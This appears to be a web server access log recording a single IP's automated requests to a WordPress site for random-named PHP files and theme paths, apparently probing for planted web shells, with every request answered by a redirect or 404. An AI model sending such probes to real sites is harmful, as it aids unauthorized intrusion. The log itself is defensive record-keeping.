157.245.198.0 - - [01/Dec/2023:06:06:33 -0500] "GET /RxRzjfoh.php HTTP/1.1" 301 - edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:34 -0500] "GET /RxRzjfoh.php HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:35 -0500] "GET /wp-content/themes/classic/inc/index.php HTTP/1.1" 301 - edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:36 -0500] "GET /wp-content/themes/classic/inc/ HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:36 -0500] "GET /wp-content/themes/classic/inc/RxRvmdpr.php HTTP/1.1" 301 - edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:37 -0500] "GET /wp-content/themes/classic/inc/RxRvmdpr.php HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:38 -0500] "GET /wp-content/themes/classic/inc/index.php HTTP/1.1" 301 - edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
